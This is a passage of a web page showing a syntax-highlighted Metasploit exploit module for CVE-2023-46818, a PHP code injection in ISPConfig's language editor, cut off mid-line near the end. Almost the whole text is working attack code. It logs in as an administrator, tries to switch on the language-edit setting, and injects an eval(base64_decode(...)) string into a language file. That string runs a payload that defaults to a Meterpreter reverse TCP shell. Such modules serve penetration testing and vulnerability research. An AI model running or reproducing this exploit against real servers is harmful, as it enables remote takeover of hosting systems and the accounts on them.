class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><br><span class="hljs-comment">##</span><br><span class="hljs-comment"># This module requires Metasploit: https://metasploit.com/download</span><br><span class="hljs-comment"># Current source: https://github.com/rapid7/metasploit-framework</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MetasploitModule</span> &lt; <span class="hljs-title class_ inherited__">Msf::Exploit::Remote</span><br>  <span class="hljs-title class_">Rank</span> = <span class="hljs-title class_">ExcellentRanking</span><br><br>  <span class="hljs-keyword">prepend</span> <span class="hljs-title class_">Msf</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Exploit</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Remote</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:AutoCheck</span><br>  <span class="hljs-keyword">include</span> <span class="hljs-title class_">Msf::Exploit::Remote::HttpClient</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">initialize</span>(<span class="hljs-params">info = &#123;&#125;</span>)<br>    <span class="hljs-variable language_">super</span>(<br>      update_info(<br>        info,<br>        <span class="hljs-string">&#x27;Name&#x27;</span> =&gt; <span class="hljs-string">&#x27;ISPConfig language_edit.php PHP Code Injection&#x27;</span>,<br>        <span class="hljs-string">&#x27;Description&#x27;</span> =&gt; <span class="hljs-string">%q&#123;</span><br><span class="hljs-string">          This module exploits a PHP code injection vulnerability in ISPConfig&#x27;s</span><br><span class="hljs-string">          language_edit.php file. The vulnerability occurs when the `admin_allow_langedit`</span><br><span class="hljs-string">          setting is enabled, allowing authenticated administrators to inject arbitrary</span><br><span class="hljs-string">          PHP code through the language editor interface.</span><br><span class="hljs-string">          </span><br><span class="hljs-string">          This module will automatically check if the required `admin_allow_langedit`</span><br><span class="hljs-string">          permission is enabled, and attempt to enable it if it&#x27;s disabled (requires</span><br><span class="hljs-string">          admin credentials with system configuration access).</span><br><span class="hljs-string">          </span><br><span class="hljs-string">          The exploit works by injecting a PHP payload into a language file, which</span><br><span class="hljs-string">          is then executed when the file is accessed. The payload is base64 encoded</span><br><span class="hljs-string">          and written using PHP&#x27;s file_put_contents function.</span><br><span class="hljs-string">        &#125;</span>,<br>        <span class="hljs-string">&#x27;License&#x27;</span> =&gt; <span class="hljs-variable constant_">MSF_LICENSE</span>,<br>        <span class="hljs-string">&#x27;Author&#x27;</span> =&gt; [<br>          <span class="hljs-string">&#x27;syfi&#x27;</span>, <span class="hljs-comment"># Discovery and PoC</span><br>          <span class="hljs-string">&#x27;Egidio Romano&#x27;</span><br>        ],<br>        <span class="hljs-string">&#x27;References&#x27;</span> =&gt; [<br>          [<span class="hljs-string">&#x27;CVE&#x27;</span>, <span class="hljs-string">&#x27;2023-46818&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://github.com/SyFi/CVE-2023-46818&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://karmainsecurity.com/KIS-2023-13&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://karmainsecurity.com/pocs/CVE-2023-46818.php&#x27;</span>]<br>        ],<br>        <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; <span class="hljs-string">&#x27;php&#x27;</span>,<br>        <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; <span class="hljs-variable constant_">ARCH_PHP</span>,<br>        <span class="hljs-string">&#x27;Targets&#x27;</span> =&gt; [<br>          [<br>            <span class="hljs-string">&#x27;Automatic PHP&#x27;</span>,<br>            &#123;<br>              <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; <span class="hljs-string">&#x27;php&#x27;</span>,<br>              <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; <span class="hljs-variable constant_">ARCH_PHP</span><br>            &#125;<br>          ]<br>        ],<br>        <span class="hljs-string">&#x27;Privileged&#x27;</span> =&gt; <span class="hljs-literal">false</span>,<br>        <span class="hljs-string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="hljs-string">&#x27;2023-10-24&#x27;</span>,<br>        <span class="hljs-string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&#x27;DefaultOptions&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;PAYLOAD&#x27;</span> =&gt; <span class="hljs-string">&#x27;php/meterpreter/reverse_tcp&#x27;</span><br>        &#125;,<br>        <span class="hljs-string">&#x27;Notes&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;Stability&#x27;</span> =&gt; [<span class="hljs-variable constant_">CRASH_SAFE</span>],<br>          <span class="hljs-string">&#x27;Reliability&#x27;</span> =&gt; [<span class="hljs-variable constant_">REPEATABLE_SESSION</span>],<br>          <span class="hljs-string">&#x27;SideEffects&#x27;</span> =&gt; [<span class="hljs-variable constant_">IOC_IN_LOGS</span>]<br>        &#125;<br>      )<br>    )<br><br>    register_options([<br>      <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;TARGETURI&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;The URI path to ISPConfig&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>]),<br>      <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;USERNAME&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;ISPConfig administrator username&#x27;</span>]),<br>      <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;PASSWORD&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;ISPConfig administrator password&#x27;</span>])<br>    ])<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span><br>    print_status(<span class="hljs-string">&#x27;Checking if the target is ISPConfig...&#x27;</span>)<br>    <span class="hljs-comment"># Always try to log in and parse version, since credentials are required</span><br>    <span class="hljs-comment"># Clear any existing cookies before login</span><br>    cookie_jar.clear<br>    <br>    login_res = send_request_cgi!(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;login/&#x27;</span>),<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; &#123;<br>        <span class="hljs-string">&#x27;username&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>],<br>        <span class="hljs-string">&#x27;password&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>],<br>        <span class="hljs-string">&#x27;s_mod&#x27;</span> =&gt; <span class="hljs-string">&#x27;login&#x27;</span><br>      &#125;,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    <span class="hljs-keyword">if</span> login_res &amp;&amp; (login_res.headers[<span class="hljs-string">&#x27;Location&#x27;</span>]&amp;.<span class="hljs-keyword">include</span>?(<span class="hljs-string">&#x27;admin&#x27;</span>) |<span class="hljs-params"></span>| login_res.body.downcase.<span class="hljs-keyword">include</span>?(<span class="hljs-string">&#x27;dashboard&#x27;</span>))<br>      <span class="hljs-comment"># Try to access the dashboard or settings page</span><br>      settings_res = send_request_cgi(&#123;<br>        <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>        <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;help&#x27;</span>, <span class="hljs-string">&#x27;version.php&#x27;</span>),<br>        <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>      &#125;)<br>      <span class="hljs-keyword">if</span> settings_res<br>        doc = settings_res.get_html_document<br>        <span class="hljs-comment"># Try to find version in a span, div, or similar element</span><br>        version_element = doc.at(<span class="hljs-string">&#x27;//p[@class=&quot;frmTextHead&quot;]&#x27;</span>)<br>        <span class="hljs-keyword">if</span> version_element<br>          version_text = version_element.text<br>          version = version_text.split(<span class="hljs-string">&quot;:&quot;</span>)[<span class="hljs-number">1</span>].gsub(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<br>          version = <span class="hljs-title class_">Rex::Version</span>.new(version)<br>          <span class="hljs-keyword">if</span> version &lt; <span class="hljs-title class_">Rex::Version</span>.new(<span class="hljs-string">&#x27;3.2.11p1&#x27;</span>)<br>            print_good(<span class="hljs-string">&quot;ISPConfig version detected: <span class="hljs-subst">#&#123;version_text&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-title class_">CheckCode</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Vulnerable</span>(<span class="hljs-string">&quot;Version: <span class="hljs-subst">#&#123;version_text&#125;</span>&quot;</span>)<br>          <span class="hljs-keyword">end</span><br>        <span class="hljs-keyword">end</span><br>      <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">end</span><br>    <span class="hljs-title class_">CheckCode</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Safe</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">authenticate</span><br>    print_status(<span class="hljs-string">&quot;Attempting login with username &#x27;<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>]&#125;</span>&#x27; and password &#x27;<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>]&#125;</span>&#x27;&quot;</span>)<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;login&#x27;</span>),<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; &#123;<br>        <span class="hljs-string">&#x27;username&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>],<br>        <span class="hljs-string">&#x27;password&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>],<br>        <span class="hljs-string">&#x27;s_mod&#x27;</span> =&gt; <span class="hljs-string">&#x27;login&#x27;</span><br>      &#125;,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:NoAccess</span>, <span class="hljs-string">&#x27;Login request failed&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    <span class="hljs-keyword">if</span> res&amp;.code == <span class="hljs-number">302</span><br>      res = send_request_cgi(&#123;<br>        <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>         <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;login/&#x27;</span>,res&amp;.headers.fetch(<span class="hljs-string">&#x27;Location&#x27;</span>,<span class="hljs-literal">nil</span>))<br>      &#125;)<br>    <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">if</span> res.body.match(<span class="hljs-regexp">/Username or Password wrong/i</span>)<br>      fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:NoAccess</span>, <span class="hljs-string">&#x27;Login failed: Invalid credentials&#x27;</span>)<br>    <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">if</span> res.headers.fetch(<span class="hljs-string">&#x27;Location&#x27;</span>,<span class="hljs-literal">nil</span>)&amp;.<span class="hljs-keyword">include</span>?(<span class="hljs-string">&#x27;admin&#x27;</span>) |<span class="hljs-params"></span>|<br>       res.body.downcase.<span class="hljs-keyword">include</span>?(<span class="hljs-string">&#x27;dashboard&#x27;</span>)<br>      print_good(<span class="hljs-string">&#x27;Login successful!&#x27;</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>    <span class="hljs-keyword">end</span><br>    print_warning(<span class="hljs-string">&#x27;Login status unclear, attempting to continue...&#x27;</span>)<br>    <span class="hljs-literal">true</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">check_langedit_permission</span><br>    print_status(<span class="hljs-string">&#x27;Checking if admin_allow_langedit is enabled...&#x27;</span>)<br>    <br>    <span class="hljs-comment"># Try to access the language editor to see if it&#x27;s accessible</span><br>    edit_url = normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;language_edit.php&#x27;</span>)<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    <br>    <span class="hljs-keyword">if</span> res&amp;.code == <span class="hljs-number">200</span> &amp;&amp; res.body.<span class="hljs-keyword">include</span>?(<span class="hljs-string">&#x27;language_edit&#x27;</span>)<br>      print_good(<span class="hljs-string">&#x27;Language editor is accessible - admin_allow_langedit appears to be enabled&#x27;</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>    <span class="hljs-keyword">elsif</span> res&amp;.code == <span class="hljs-number">403</span><br>      print_warning(<span class="hljs-string">&#x27;Language editor access denied - admin_allow_langedit may be disabled&#x27;</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    <span class="hljs-keyword">else</span><br>      print_warning(<span class="hljs-string">&#x27;Could not determine language editor accessibility&#x27;</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">enable_langedit_permission</span><br>    print_status(<span class="hljs-string">&#x27;Attempting to enable admin_allow_langedit...&#x27;</span>)<br>    <br>    <span class="hljs-comment"># Try to access the system settings page</span><br>    settings_url = normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;system_config.php&#x27;</span>)<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; settings_url,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    <br>    <span class="hljs-keyword">unless</span> res &amp;&amp; res.code == <span class="hljs-number">200</span><br>      print_warning(<span class="hljs-string">&#x27;Could not access system configuration page&#x27;</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    <span class="hljs-keyword">end</span><br>    <br>    doc = res.get_html_document<br>    csrf_id = doc.at(<span class="hljs-string">&#x27;input[name=&quot;_csrf_id&quot;]&#x27;</span>)&amp;.[](<span class="hljs-string">&#x27;value&#x27;</span>)<br>    csrf_key = doc.at(<span class="hljs-string">&#x27;input[name=&quot;_csrf_key&quot;]&#x27;</span>)&amp;.[](<span class="hljs-string">&#x27;value&#x27;</span>)<br>    <br>    <span class="hljs-keyword">unless</span> csrf_id &amp;&amp; csrf_key<br>      print_warning(<span class="hljs-string">&#x27;Could not extract CSRF tokens from system config page&#x27;</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    <span class="hljs-keyword">end</span><br>    <br>    <span class="hljs-comment"># Try to enable the setting</span><br>    enable_data = &#123;<br>      <span class="hljs-string">&#x27;_csrf_id&#x27;</span> =&gt; csrf_id,<br>      <span class="hljs-string">&#x27;_csrf_key&#x27;</span> =&gt; csrf_key,<br>      <span class="hljs-string">&#x27;admin_allow_langedit&#x27;</span> =&gt; <span class="hljs-string">&#x27;1&#x27;</span>,<br>      <span class="hljs-string">&#x27;action&#x27;</span> =&gt; <span class="hljs-string">&#x27;save&#x27;</span><br>    &#125;<br>    <br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; settings_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; enable_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    <br>    <span class="hljs-keyword">if</span> res &amp;&amp; res.code == <span class="hljs-number">200</span><br>      print_good(<span class="hljs-string">&#x27;Successfully enabled admin_allow_langedit&#x27;</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>    <span class="hljs-keyword">else</span><br>      print_warning(<span class="hljs-string">&#x27;Failed to enable admin_allow_langedit&#x27;</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">inject_payload</span><br>    print_status(<span class="hljs-string">&#x27;Injecting PHP payload...&#x27;</span>)<br>    <span class="hljs-variable">@payload_file</span> = <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;<span class="hljs-title class_">Rex</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Text</span>.rand_text_alpha_lower(<span class="hljs-number">8</span>)&#125;</span>.php&quot;</span><br>    b64_payload = <span class="hljs-title class_">Base64</span>.strict_encode64(payload.encoded)<br>    injection = <span class="hljs-string">&quot;&#x27;];eval(base64_decode(&#x27;<span class="hljs-subst">#&#123;b64_payload&#125;</span>&#x27;));die;#&quot;</span><br>    lang_file = <span class="hljs-title class_">Rex</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Text</span>.rand_text_alpha_lower(<span class="hljs-number">10</span>) + <span class="hljs-string">&quot;.lng&quot;</span><br>    edit_url = normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;language_edit.php&#x27;</span>)<br>    initial_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file<br>    &#125;<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; initial_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:UnexpectedReply</span>, <span class="hljs-string">&#x27;Unable to access language_edit.php&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    doc = res.get_html_document<br>    csrf_id = doc.at(<span class="hljs-string">&#x27;input[name=&quot;_csrf_id&quot;]&#x27;</span>)&amp;.[](<span class="hljs-string">&#x27;value&#x27;</span>)<br>    csrf_key = doc.at(<span class="hljs-string">&#x27;input[name=&quot;_csrf_key&quot;]&#x27;</span>)&amp;.[](<span class="hljs-string">&#x27;value&#x27;</span>)<br>    <span class="hljs-keyword">unless</span> csrf_id &amp;&amp; csrf_key<br>      fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:UnexpectedReply</span>, <span class="hljs-string">&#x27;CSRF tokens not found!&#x27;</span>)<br>    <span class="hljs-keyword">end</span><br>    print_good(<span class="hljs-string">&quot;Extracted CSRF tokens: ID=<span class="hljs-subst">#&#123;csrf_id[<span class="hljs-number">0</span>..<span class="hljs-number">10</span>]&#125;</span>..., KEY=<span class="hljs-subst">#&#123;csrf_key[<span class="hljs-number">0</span>..<span class="hljs-number">10</span>]&#125;</span>...&quot;</span>)<br>    injection_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file,<br>      <span class="hljs-string">&#x27;_csrf_id&#x27;</span> =&gt; csrf_id,<br>      <span class="hljs-string">&#x27;_csrf_key&#x27;</span> =&gt; csrf_key,<br>      <span class="hljs-string">&#x27;records[\]&#x27;</span> =&gt; injection<br>    &#125;<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; injection_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:UnexpectedReply</span>, <span class="hljs-string">&#x27;Injection request failed&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    payload_url = normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-variable">@payload_file</span>)<br>    print_good(<span class="hljs-string">&quot;Payload successfully injected: <span class="hljs-subst">#&#123;<span class="hljs-variable">@payload_file</span>&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> payload_url<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span><br>    <span class="hljs-keyword">unless</span> authenticate<br>      fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:NoAccess</span>, <span class="hljs-string">&#x27;Login failed&#x27;</span>)<br>    <span class="hljs-keyword">end</span><br>    <br>    <span class="hljs-comment"># Check if language editor permissions are enabled</span><br>    <span class="hljs-keyword">unless</span> check_langedit_permission<br>      print_warning(<span class="hljs-string">&#x27;admin_allow_langedit appears to be disabled&#x27;</span>)<br>      print_status(<span class="hljs-string">&#x27;Attempting to enable admin_allow_langedit...&#x27;</span>)<br>      <br>      <span class="hljs-keyword">if</span> enable_langedit_permission<br>        print_good(<span class="hljs-string">&#x27;Successfully enabled admin_allow_langedit, retrying exploit...&#x27;</span>)<br>        <span class="hljs-comment"># Re-check permissions after enabling</span><br>        <span class="hljs-keyword">unless</span> check_langedit_permission<br>          fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:UnexpectedReply</span>, <span class="hljs-string">&#x27;Failed to enable admin_allow_langedit or language editor still not accessible&#x27;</span>)<br>        <span class="hljs-keyword">end</span><br>      <span class="hljs-keyword">else</span><br>        fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:UnexpectedReply</span>, <span class="hljs-string">&#x27;Could not enable admin_allow_langedit - exploit requires this setting to be enabled&#x27;</span>)<br>      <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">end</span><br>    <br>    payload_url = inject_payload<br>    print_status(<span class="hljs-string">&#x27;Starting payload handler...&#x27;</span>)<br>    print_status(<span class="hljs-string">&#x27;Manual trigger information:&#x27;</span>)<br>    print_line(<span class="hljs-string">&quot;URL: <span class="hljs-subst">#&#123;full_uri&#125;</span><span class="hljs-subst">#&#123;payload_url&#125;</span>&quot;</span>)<br>    print_line(<span class="hljs-string">&quot;Manual trigger: curl &#x27;<span class="hljs-subst">#&#123;full_uri&#125;</span><span 